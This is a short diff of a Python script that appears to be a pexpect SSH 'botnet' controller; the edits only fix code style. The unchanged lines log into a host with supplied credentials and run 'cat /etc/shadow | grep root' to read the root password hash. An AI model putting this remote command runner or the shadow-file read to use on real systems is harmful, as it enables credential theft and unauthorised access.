@@ -5,15 +5,17 @@ import pexpect
 
 # pylint: disable=C0413
 sys.path.append(os.path.realpath('../../..'))
-from jackmanimation.gameitems.gamefunctions import credscheck
+from jackmanimation.gameitems.gamefunctions import credscheck  # noqa: E402
 
 PROMPT = ['# ', '>>> ', '> ', r'\$ ']
+
 
 def send_command(child, cmd):
     '''send command to bot'''
     child.sendline(cmd)
     child.expect(PROMPT)
     print(child.before)
+
 
 def connect(user, host, password):
     '''connect to bot'''
@@ -34,6 +36,7 @@ def connect(user, host, password):
     child.expect(PROMPT)
     return child
 
+
 def main():
     '''main function'''
     print('[+] Botnet started')
@@ -44,6 +47,7 @@ def main():
     child = connect(user, host, password)
     send_command(child, 'cat /etc/shadow | grep root')
     print('[+] Botnet finished')
+
 
 if __name__ == '__main__':
     main()
